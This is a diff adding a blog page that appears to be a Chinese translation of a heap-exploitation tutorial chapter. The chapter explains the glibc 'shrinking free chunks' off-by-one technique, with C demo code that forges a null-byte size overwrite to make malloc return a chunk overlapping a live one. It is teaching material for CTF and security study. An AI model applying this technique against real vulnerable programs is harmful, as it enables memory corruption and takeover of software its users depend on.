@@ -1,0 +1,235 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="zh-CN" lang="zh-CN">
+
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+  <meta name="author" content="Vancir" />
+  <title>Heap Exploitation系列翻译-12 Shrinking Free Chunks</title>
+  <link rel="shortcut icon" href="/favicon.ico" />
+  <link href="/feed/" rel="alternate" title="Vancir" type="application/atom+xml" />
+  <link rel="stylesheet" href="/media/css/style.css" />
+  <link rel="stylesheet" href="/media/css/highlight.css" />
+  <script type="text/javascript" src="https://code.jquery.com/jquery-3.3.1.min.js"></script>
+  <script type="text/javascript" src="/media/js/outliner.js"></script>
+</head>
+<!--  <body> 
+-->
+<script type="text/javascript">
+  function setTimeSpan() {
+    var date = new Date();
+    timeSpan.innerText = date.format('yyyy-MM-dd hh:mm:ss');
+  }
+
+  Date.prototype.format = function (format) {
+    var o =
+      {
+        "M+": this.getMonth() + 1, //month
+        "d+": this.getDate(),    //day
+        "h+": this.getHours(),   //hour
+        "m+": this.getMinutes(), //minute
+        "s+": this.getSeconds(), //second
+        "q+": Math.floor((this.getMonth() + 3) / 3),  //quarter
+        "S": this.getMilliseconds() //millisecond
+      }
+    if (/(y+)/.test(format))
+      format = format.replace(RegExp.$1, (this.getFullYear() + "").substr(4 - RegExp.$1.length));
+    for (var k in o)
+      if (new RegExp("(" + k + ")").test(format))
+        format = format.replace(RegExp.$1, RegExp.$1.length == 1 ? o[k] : ("00" + o[k]).substr(("" + o[k]).length));
+    return format;
+  }
+</script>
+
+<body onLoad="setInterval(setTimeSpan,1000);">
+  <div id="container">
+    <div id="main" role="main">
+      <header>
+        <h1>Heap Exploitation系列翻译-12 Shrinking Free Chunks</h1>
+      </header>
+      <nav id="real_nav">
+        <span>
+          <a title="home" class="" href="/">home</a>
+        </span>
+        <span>
+          <a title="categories" class="" href="/categories/">categories</a>
+        </span>
+        <span>
+          <a title="tags" class="" href="/tags/">tags</a>
+        </span>
+        <span>
+          <a title="tools" class="" href="/repo/">repo</a>
+        </span>
+        <span>
+          <a title="tools" class="" href="/act/">act</a>
+        </span>
+        <span>
+          <a title="tools" class="" href="/books/">books</a>
+        </span>
+        <span>
+          <a title="tools" class="" href="/musics/">musics</a>
+        </span>
+        <span>
+          <a title="tools" class="" href="/movies/">movies</a>
+        </span>
+        <span>
+          <a title="links" class="" href="/friends/">friends</a>
+        </span>
+        <span>
+          <a title="about" class="" href="/about/">about</a>
+        </span>
+        <span>
+          <a title="feed" class="" href="/feed">subscribe</a>
+        </span>
+      </nav>
+      <article class="content">
+        <section class="meta">
+<span class="time">
+  <time datetime="2017-08-12">2017-08-12</time>
+</span>
+
+ | 
+<span class="categories">
+  categories
+  
+  <a href="/categories/#translations" title="translations">translations</a>&nbsp;
+  
+</span>
+
+
+ | 
+<span class="tags">
+  tags
+  
+  <a href="/tags/#CTF" title="CTF">CTF</a>&nbsp;
+  
+  <a href="/tags/#pwn" title="pwn">pwn</a>&nbsp;
+  
+  <a href="/tags/#heap" title="heap">heap</a>&nbsp;
+  
+</span>
+
+</section>
+<section class="post">
+<blockquote>
+  <p>本文是对Dhaval Kapil的<a href="https://heap-exploitation.dhavalkapil.com/">Heap Exploitation</a>系列教程的译文</p>
+</blockquote>
+
+<p>这项攻击在’<a href="http://www.contextis.com/documents/120/Glibc_Adventures-The_Forgotten_Chunks.pdf">Glibc Adventures: The Forgotten Chunk</a>‘中有详细描述. 它是利用单字节堆溢出(通常也被称作 ‘<a href="https://en.wikipedia.org/wiki/Off-by-one_error">off by one</a>’). 这项攻击技术的目标是让’malloc’返回一个跟某一已分配堆块重叠的堆块, 该堆块目前也处在使用状态. 起始在内存中的3块连续堆块(<code class="highlighter-rouge">a</code>, <code class="highlighter-rouge">b</code>, <code class="highlighter-rouge">c</code>)被分配出来并且中间那块已经被释放了. 第一块堆块存在溢出漏洞, 可以利用溢出覆写中间堆块的’size’. 攻击者的最低有效字节是0, 也就’缩减’了堆块的大小. 接下来,从中间的空闲堆块中分配出两个small chunks(<code class="highlighter-rouge">b1</code> 和 <code class="highlighter-rouge">b2</code>). 第三个堆块的<code class="highlighter-rouge">prev_size</code>并没有得到更新, 因为<code class="highlighter-rouge">b</code>+<code class="highlighter-rouge">b-&gt;size</code>已经不再指向<code class="highlighter-rouge">c</code>, 实际上它指向的是在<code class="highlighter-rouge">c</code>之前的一块内存区域. 之后, <code class="highlighter-rouge">b1</code>和<code class="highlighter-rouge">c</code>都被释放, <code class="highlighter-rouge">c</code>仍旧认定<code class="highlighter-rouge">b</code>是处于空闲的(这是因为<code class="highlighter-rouge">prev_size</code>并没有更新,因此<code class="highlighter-rouge">c</code>-<code class="highlighter-rouge">c-&gt;prev_size</code>依旧指向<code class="highlighter-rouge">b</code>)并与<code class="highlighter-rouge">b</code>进行合并. 这也就导致了生成一个起始于<code class="highlighter-rouge">b</code>大空闲块并同时与<code class="highlighter-rouge">b2</code>相重叠了. 一个新的malloc将这个大堆块返回回来, 从而完成这项攻击. 下图总结了这些步骤:</p>
+
+<p><img src="https://heap-exploitation.dhavalkapil.com/assets/images/shrinking_free_chunks.png" alt="Summary of shrinking free chunks attack steps" /></p>
+
+<p><em>图片来源: https://www.contextis.com/documents/120/Glibc_Adventures-The_Forgotten_Chunks.pdf</em></p>
+
+<p>考虑以下示例代码(下载完整版本: <a href="https://heap-exploitation.dhavalkapil.com/assets/files/shrinking_free_chunks.c">这里</a>)</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="n">chunk_structure</span> <span class="p">{</span>
+  <span class="kt">size_t</span> <span class="n">prev_size</span><span class="p">;</span>
+  <span class="kt">size_t</span> <span class="n">size</span><span class="p">;</span>
+  <span class="k">struct</span> <span class="n">chunk_structure</span> <span class="o">*</span><span class="n">fd</span><span class="p">;</span>
+  <span class="k">struct</span> <span class="n">chunk_structure</span> <span class="o">*</span><span class="n">bk</span><span class="p">;</span>
+  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">19</span><span class="p">];</span>               <span class="c1">// padding
+</span><span class="p">};</span>
+
+<span class="kt">void</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">*</span><span class="n">b</span><span class="p">,</span> <span class="o">*</span><span class="n">c</span><span class="p">,</span> <span class="o">*</span><span class="n">b1</span><span class="p">,</span> <span class="o">*</span><span class="n">b2</span><span class="p">,</span> <span class="o">*</span><span class="n">big</span><span class="p">;</span>
+<span class="k">struct</span> <span class="n">chunk_structure</span> <span class="o">*</span><span class="n">b_chunk</span><span class="p">,</span> <span class="o">*</span><span class="n">c_chunk</span><span class="p">;</span>
+
+<span class="c1">// Grab three consecutive chunks in memory
+</span><span class="n">a</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x100</span><span class="p">);</span>                            <span class="c1">// at 0xfee010
+</span><span class="n">b</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x200</span><span class="p">);</span>                            <span class="c1">// at 0xfee120
+</span><span class="n">c</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x100</span><span class="p">);</span>                            <span class="c1">// at 0xfee330
+</span>
+<span class="n">b_chunk</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">chunk_structure</span> <span class="o">*</span><span class="p">)(</span><span class="n">b</span> <span class="o">-</span> <span class="mi">2</span><span class="o">*</span><span class="k">sizeof</span><span class="p">(</span><span class="kt">size_t</span><span class="p">));</span>
+<span class="n">c_chunk</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">chunk_structure</span> <span class="o">*</span><span class="p">)(</span><span class="n">c</span> <span class="o">-</span> <span class="mi">2</span><span class="o">*</span><span class="k">sizeof</span><span class="p">(</span><span class="kt">size_t</span><span class="p">));</span>
+
+<span class="c1">// free b, now there is a large gap between 'a' and 'c' in memory
+// b will end up in unsorted bin
+</span><span class="n">free</span><span class="p">(</span><span class="n">b</span><span class="p">);</span>
+
+<span class="c1">// Attacker overflows 'a' and overwrites least significant byte of b's size
+// with 0x00. This will decrease b's size.
+</span><span class="o">*</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">b_chunk</span><span class="o">-&gt;</span><span class="n">size</span> <span class="o">=</span> <span class="mh">0x00</span><span class="p">;</span>
+
+<span class="c1">// Allocate another chunk
+// 'b' will be used to service this chunk.
+// c's previous size will not updated. In fact, the update will be done a few
+// bytes before c's previous size as b's size has decreased.
+// So, b + b-&gt;size is behind c.
+// c will assume that the previous chunk (c - c-&gt;prev_size = b/b1) is free
+</span><span class="n">b1</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x80</span><span class="p">);</span>                           <span class="c1">// at 0xfee120
+</span>
+<span class="c1">// Allocate another chunk
+// This will come directly after b1
+</span><span class="n">b2</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x80</span><span class="p">);</span>                           <span class="c1">// at 0xfee1b0
+</span><span class="n">strcpy</span><span class="p">(</span><span class="n">b2</span><span class="p">,</span> <span class="s">"victim's data"</span><span class="p">);</span>
+
+<span class="c1">// Free b1
+</span><span class="n">free</span><span class="p">(</span><span class="n">b1</span><span class="p">);</span>
+
+<span class="c1">// Free c
+// This will now consolidate with b/b1 thereby merging b2 within it
+// This is because c's prev_in_use bit is still 0 and its previous size
+// points to b/b1
+</span><span class="n">free</span><span class="p">(</span><span class="n">c</span><span class="p">);</span>
+
+<span class="c1">// Allocate a big chunk to cover b2's memory as well
+</span><span class="n">big</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x200</span><span class="p">);</span>                          <span class="c1">// at 0xfee120
+</span><span class="n">memset</span><span class="p">(</span><span class="n">big</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x200</span> <span class="o">-</span> <span class="mi">1</span><span class="p">);</span>
+
+<span class="n">printf</span><span class="p">(</span><span class="s">"%s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">b2</span><span class="p">);</span>       <span class="c1">// Prints AAAAAAAAAAA... !
+</span></code></pre></div></div>
+
+<p><code class="highlighter-rouge">big</code>现在指向一开始的<code class="highlighter-rouge">b</code>堆块并且与<code class="highlighter-rouge">b2</code>重叠. 更改<code class="highlighter-rouge">big</code>的内容会改变<code class="highlighter-rouge">b2</code>的内容, 即时两个堆块都不会被释放.</p>
+
+<p>值得注意的是, 与缩减<code class="highlighter-rouge">b</code>块相反, 攻击者其实也可以增加<code class="highlighter-rouge">b</code>块的大小. 这也同样可以造成类似情况的重叠. 当’malloc’申请另一个更大的堆块, <code class="highlighter-rouge">b</code>就会用于满足这个申请需求, 这样<code class="highlighter-rouge">c</code>的内存也会作为新堆块的一部分返回回来.</p>
+
+</section>
+<section align="right">
+<br/>
+<span>
+	<a  href="/2017/08/12/house-of-spirit/" class="pageNav"  >Previous</a>
+	&nbsp;&nbsp;&nbsp;
+	<a  href="/2017/08/12/unlink-exploit/" class="pageNav"  >Next</a>
+</span>
+</section>
+
+<script type="text/javascript">
+$(function(){
+  $(document).keydown(function(e) {
+    var url = false;
+        if (e.which == 37 || e.which == 74) {  // Left arrow and J
+            
+        url = 'http://localhost:4000/2017/08/12/house-of-spirit/';
+        
+        }
+        else if (e.which == 39 || e.which == 75) {  // Right arrow and K
+            
+        url = 'http://localhost:4000/2017/08/12/unlink-exploit/';
+        
+        }
+        if (url) {
+            window.location = url;
+        }
+  });
+})
+</script>
+
+      </article>
+      <a style="position:fixed;bottom:5px;right:5px;" href="#" title="Back to Top">
+        <img src="/assets/btt.png" />
+      </a>
+    </div>
+    <footer>
+      <p>
+        <small>
+          Powered by
+          <a href="http://jekyllrb.com" target="_blank">Jekyll</a> @
+          <a href="https://github.com/Vancir/vancir.github.io" target="_blank" title="project homepage">github</a> | Copyright 2017 - 2018 by
+          <a href="/about/">Vancir</a> |
+          <span class="label label-info" id="timeSpan"></span>
+        </small>
+      </p>
+    </footer>
+  </div>
+</body>
+
+</html>
